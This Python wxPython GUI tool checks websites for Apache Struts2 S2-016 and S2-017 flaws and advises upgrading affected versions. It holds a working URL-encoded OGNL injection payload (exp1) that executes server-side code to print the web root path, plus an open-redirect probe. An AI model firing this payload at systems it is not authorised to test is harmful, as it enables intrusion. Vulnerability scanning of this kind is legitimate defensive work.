# coding: utf-8
# Author: tntC4stl3
# Name  : Struts2 S2-016 S2-017检测工具

import wx
import requests
import re
import urllib2	
from bs4 import BeautifulSoup

class Struts2checker(wx.Frame):
	"""界面布局"""
	def __init__(self):
		wx.Frame.__init__(self, None, -1, u"Struts2 S2-016 S2-017漏洞检查工具", size=(600, 260))
		panel = wx.Panel(self)

		self.icon = wx.Icon('favicon.ico', wx.BITMAP_TYPE_ICO)
		self.SetIcon(self.icon)

		#typeList = [u'以.action/.jsp/.do结尾的url (如：http://192.168.12.220/struts2-blank/example/HelloWorld.action)', u'带表单的url (如：有登陆框的页面)']
		#self.checkBox = wx.RadioBox(panel, -1, u'选项', (-1, 10), wx.DefaultSize, 
	#				typeList, 1, wx.RA_SPECIFY_COLS)
		urlLbl = wx.StaticText(panel, -1, u"URL地址：")
		self.urlText = wx.TextCtrl(panel, -1, u"", style=wx.TE_LEFT)
		checkBtn = wx.Button(panel, -1, u"检测")
		self.Bind(wx.EVT_BUTTON, self.vulnCheck, checkBtn)
		self.resultText = wx.TextCtrl(panel, -1, "", size=(-1, 100),
							style=wx.TE_MULTILINE|wx.TE_READONLY)
		adviceLbl = wx.StaticText(panel, -1, 
			u"提示：建议输入以.action/.jsp/.do结尾的url (如：http://192.168.12.220/HelloWorld.action) 或者页面带表单的url (如：带有用户名密码输入框)",
			style=wx.TE_MULTILINE, size=(-1, 30))

		# main Sizer
		mainSizer = wx.BoxSizer(wx.VERTICAL)

		checkSizer = wx.GridBagSizer(hgap=1, vgap=4)
		checkSizer.AddGrowableCol(1)
		checkSizer.Add(urlLbl, pos=(0, 0))
		checkSizer.Add(self.urlText, pos=(0, 1), flag=wx.EXPAND)
		checkSizer.Add(checkBtn, pos=(0, 3))
		mainSizer.Add(checkSizer, 0, wx.EXPAND|wx.TOP|wx.LEFT|wx.RIGHT, 10)

		mainSizer.Add(adviceLbl, 0, wx.EXPAND|wx.TOP|wx.LEFT|wx.RIGHT, 10)

		resultBox = wx.StaticBox(panel, -1, u"扫描结果")
		resultSizer = wx.StaticBoxSizer(resultBox, wx.VERTICAL)
		resultSizer.Add(self.resultText, 0, wx.EXPAND, 10)
		mainSizer.Add(resultSizer, 0, wx.EXPAND|wx.ALL, 10)

		panel.SetSizer(mainSizer)

		self.Show(True)

	# S2-016
	def exp1(self, url):
		exp = "?redirect%3A%24%7B%23req%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27%29%2C%23a%3D%23req.getSession%28%29%2C%23b%3D%23a.getServletContext%28%29%2C%23c%3D%23b.getRealPath%28%22%2F%22%29%2C%23matt%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23matt.getWriter%28%29.println%28%23c%29%2C%23matt.getWriter%28%29.flush%28%29%2C%23matt.getWriter%28%29.close%28%29%7D"
		string = url + exp

		path_compile = r'(^[a-zA-Z]:(((\\(?! )[^\\\:*?"<>|]+)+\\?)|(\\))\s*$)|(^/([^/ \t]+/)*$)'
		try:
			r = requests.get(string, verify=False)
			if re.match(path_compile, r.content.strip()):
				return 1
		except:
			return 0

	# S2-017
	def exp2(self, url):
		exp = "?redirect:http://www.venustech.com.cn/"
		string = url + exp

		try:
			r = requests.get(string, verify=False, allow_redirects=False)
			if r.headers['location'] == 'http://www.venustech.com.cn/':
				return 1
		except:
			return 0

	def getAction(self, url, action):
		s = re.search(r'.*\.(action|jsp|do)', action)
		action = s.group(0)
		if action.startswith('/'):
			r = urllib2.Request(url)
			string = '%s://%s%s' % (r.get_type(), r.get_host(), action)
		else:
			if url.endswith('/'):
				string = url + action
			else:
				string = url + '/' + action
		return string

	def vulnCheck(self, event):
		self.resultText.Clear()
		url = self.urlText.GetValue().strip()
		if url == '':
			dlg = wx.MessageDialog(self, u'URL地址为空！', '', wx.OK|wx.ICON_ERROR)
			if dlg.ShowModal() == wx.ID_OK:
				dlg.Destroy()
				return
		
		try:
			r = requests.get(url, verify=False, timeout=6)
		except:
			self.resultText.AppendText(u'连接网站失败，请检查网址是否输入正确。\n')
			return

		if re.search(r'\.(action|do|jsp)$', url):
			pass
		else:
			soup = BeautifulSoup(r.content)
			try:
				action = soup.form['action'].strip()
				if re.search(r'\.(action|do|jsp)', action):
					url = self.getAction(url, action)
				else:
					self.resultText.AppendText(u'您的URL不符合检查要求。\n')
					return
			except:
				self.resultText.AppendText(u'您的URL不符合检查要求。\n')
				return

		print url
		rtn = self.exp1(url)
		if rtn == 1:
			self.resultText.AppendText(u'您的网站存在Struts漏洞(S2-016)，建议将Struts版本升级至2.3.15.1及以上。\n')
		else:
			self.resultText.AppendText(u'您的网站未检测到S2-016漏洞。\n')

		rtn = self.exp2(url)
		if rtn == 1:
			self.resultText.AppendText(u'您的网站存在Struts漏洞(S2-017)，建议将Struts版本升级至2.3.15.1及以上。\n')
		else:
			self.resultText.AppendText(u'您的网站未检测到S2-017漏洞。\n')


if __name__ == '__main__':
	app = wx.App(False)
	frame = Struts2checker()
	app.MainLoop()

